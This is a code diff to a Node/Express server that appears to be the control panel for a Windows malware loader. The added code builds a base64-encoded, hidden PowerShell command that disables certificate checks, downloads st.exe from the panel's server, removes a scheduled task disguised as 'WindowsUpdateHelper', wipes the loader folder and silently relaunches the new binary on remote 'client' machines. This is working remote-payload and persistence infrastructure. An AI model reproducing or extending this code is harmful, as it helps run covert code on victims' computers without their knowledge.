@@ -177,56 +177,100 @@ const getOwnUser = (uid) => db.prepare(sql`
   FROM users WHERE id = ?
 `).get(uid);
 
-// ─── wipe helper ─────────────────────────────────────────────────────────────
-// Preserves key.json across the wipe. Everything else in %APPDATA%\loader goes.
-// Then downloads fresh st.exe. If the download fails the key is still on disk,
-// so the next wipe retry works from a clean slate (no stranded client).
+// ─── wipe command builder ────────────────────────────────────────────────────
+// Runs entirely detached from the parent client. Downloads st.exe to %TEMP%
+// FIRST (with cert bypass so self-signed HTTPS works), verifies size, THEN
+// kills loader procs, wipes %APPDATA%\loader except key.json, moves the new
+// st.exe in, launches it. If the download fails at any point, we abort before
+// touching the loader — the client stays alive and a retry just works.
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.exe`;
 
-  const inner = [
-    `$ErrorActionPreference = 'SilentlyContinue'`,
-    `$dir = Join-Path $env:APPDATA 'loader'`,
-    `New-Item -ItemType Directory -Force -Path $dir | Out-Null`,
+  const script = `
+$ErrorActionPreference = 'SilentlyContinue'
+$log = Join-Path $env:TEMP 'wh-wipe.log'
+"--- $(Get-Date -Format o) ---" | Out-File -Encoding UTF8 $log
+"url: ${stUrl}" | Out-File -Encoding UTF8 -Append $log
 
-    // remove the scheduled-task persistence so a reboot can't re-fire the old client
-    `schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null`,
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-    // 1) kill loader processes first so their files unlock
-    `Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase) } | Stop-Process -Force -ErrorAction SilentlyContinue`,
-    `Start-Sleep -Milliseconds 1500`,
+function Get-St {
+  param([string]$Url, [string]$Dst)
+  Remove-Item -Force -Path $Dst -ErrorAction SilentlyContinue
+  $params = @{ Uri = $Url; OutFile = $Dst; UseBasicParsing = $true; TimeoutSec = 60; ErrorAction = 'Stop' }
+  if ($PSVersionTable.PSVersion.Major -ge 6) { $params['SkipCertificateCheck'] = $true }
+  Invoke-WebRequest @params
+}
 
-    // 2) nuke everything in loader except key.json — retry loop, files unlock
-    //    asynchronously after Stop-Process returns
-    `$keep = Join-Path $dir 'key.json'`,
-    `$keepLower = $keep.ToLower()`,
-    `for ($i=0; $i -lt 10; $i++) {`,
-    `  $left = @()`,
-    `  Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {`,
-    `    if ($_.FullName.ToLower() -ne $keepLower) {`,
-    `      try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop } catch { $left += $_.FullName }`,
-    `    }`,
-    `  }`,
-    `  if ($left.Count -eq 0) { break }`,
-    `  Start-Sleep -Milliseconds 500`,
-    `}`,
+$stTmp = Join-Path $env:TEMP 'st_new.exe'
+$ok = $false
+for ($i = 0; $i -lt 5; $i++) {
+  try {
+    Get-St -Url '${stUrl}' -Dst $stTmp
+    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true; break }
+  } catch {
+    "attempt $i failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
+    Start-Sleep -Seconds 2
+  }
+}
+if (-not $ok) {
+  try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile('${stUrl}', $stTmp)
+    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true }
+  } catch {
+    "webclient failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
+  }
+}
+if (-not $ok) {
+  "abort: download failed, loader untouched" | Out-File -Encoding UTF8 -Append $log
+  exit 1
+}
+"download ok: $((Get-Item $stTmp).Length) bytes" | Out-File -Encoding UTF8 -Append $log
 
-    // 3) pull fresh st.exe — 5 tries, WebClient fallback
-    `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
-    `$ProgressPreference = 'SilentlyContinue'`,
-    `$stDst = Join-Path $dir 'st.exe'`,
-    `$ok = $false`,
-    `for ($i=0; $i -lt 5; $i++) { try { Invoke-WebRequest -Uri '${stUrl}' -OutFile $stDst -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop; $ok = $true; break } catch { Start-Sleep -Seconds 2 } }`,
-    `if (-not $ok) { try { (New-Object System.Net.WebClient).DownloadFile('${stUrl}', $stDst); $ok = $true } catch {} }`,
-    `if (-not $ok) { exit 1 }`,
+schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null
 
-    // 4) fire detached
-    `Start-Process -FilePath $stDst -WorkingDirectory $dir -WindowStyle Hidden`,
-  ].join('; ');
+$dir = Join-Path $env:APPDATA 'loader'
+Get-Process -ErrorAction SilentlyContinue | Where-Object {
+  $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase)
+} | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Milliseconds 2000
 
-  const escaped = inner.replace(/'/g, "''");
+$keep = (Join-Path $dir 'key.json').ToLower()
+for ($i = 0; $i -lt 15; $i++) {
+  $left = @()
+  Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {
+    if ($_.FullName.ToLower() -ne $keep) {
+      try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop }
+      catch { $left += $_.FullName }
+    }
+  }
+  if ($left.Count -eq 0) { break }
+  Start-Sleep -Milliseconds 500
+}
+"wipe done, remaining: $($left.Count)" | Out-File -Encoding UTF8 -Append $log
 
-  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-Command','${escaped}')`;
+New-Item -ItemType Directory -Force -Path $dir | Out-Null
+$stDst = Join-Path $dir 'st.exe'
+for ($i = 0; $i -lt 15; $i++) {
+  try { Move-Item -Force -Path $stTmp -Destination $stDst -ErrorAction Stop; break }
+  catch { Start-Sleep -Milliseconds 500 }
+}
+"moved st.exe: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log
+
+if (Test-Path $stDst) {
+  Start-Process -FilePath $stDst -WorkingDirectory $dir -WindowStyle Hidden
+  "launched" | Out-File -Encoding UTF8 -Append $log
+} else {
+  "error: st.exe missing after move" | Out-File -Encoding UTF8 -Append $log
+}
+`;
+
+  // UTF-16LE → base64 → -EncodedCommand. No quoting problems.
+  const encoded = Buffer.from(script, 'utf16le').toString('base64');
+
+  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${encoded}')`;
 }
 
 app.use(express.static(PUBLIC_DIR, {
@@ -509,15 +553,13 @@ app.delete('/api/clients/:id', requireAuth, (req, res) => {
 });
 
 // ─── wipe + reinstall ────────────────────────────────────────────────────────
-// Preserves key.json, wipes every other file in %APPDATA%\loader, downloads
-// fresh st.exe, runs it hidden. If the download fails, key.json is still on
-// disk — retry works cleanly from a partial state.
+// Fire-and-forget: enqueue a detached PowerShell that does the work. Returns
+// immediately with a status the panel shows as "wiping + reinstalling…".
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
   if (!client) return res.status(404).json({ error: 'client not found' });
 
-  // st.exe must exist and be fresh — this is what wipe downloads
   const stPath = path.join(DOWNLOAD_DIR, 'st.exe');
   let needsBuild = !fs.existsSync(stPath);
   if (!needsBuild) {
@@ -529,7 +571,6 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
     const row = getOwnUser(req.user.uid);
     const acctKey = row?.account_key || '';
     if (!acctKey) return res.status(400).json({ error: 'no account key to build st.exe' });
-
     try {
       const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
       const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
@@ -556,8 +597,7 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   res.json({
     ok: true,
     commandId: Number(info.lastInsertRowid),
-    bytes: line.length,
-    stUrl: `${base}/api/downloads/st.exe`,
+    message: 'wiping + reinstalling',
   });
 });
 
@@ -755,7 +795,7 @@ const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1'];
 
 const limitDownloadExe = rateLimit({
   windowMs: 60 * 60 * 1000,
-  max: 100,
+  max: 200,
   standardHeaders: true,
   legacyHeaders: false,
   message: { error: 'download limit reached' },
@@ -916,7 +956,7 @@ app.post('/api/admin/remove', limitAdmin, (req, res) => {
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
-// ---------- auto builder (every 6 hours) ----------
+// ---------- auto builder (every hour, rebuild if older than 6h) ----------
 const AUTO_BUILD_INTERVAL_MS = 60 * 60 * 1000;
 const MAX_AGE_MS = 6 * 60 * 60 * 1000;
 
@@ -929,9 +969,7 @@ async function checkAutoBuild() {
       needsBuild = true;
     } else {
       const stat = fs.statSync(bootPath);
-      if (Date.now() - stat.mtimeMs > MAX_AGE_MS) {
-        needsBuild = true;
-      }
+      if (Date.now() - stat.mtimeMs > MAX_AGE_MS) needsBuild = true;
     }
 
     if (needsBuild) {
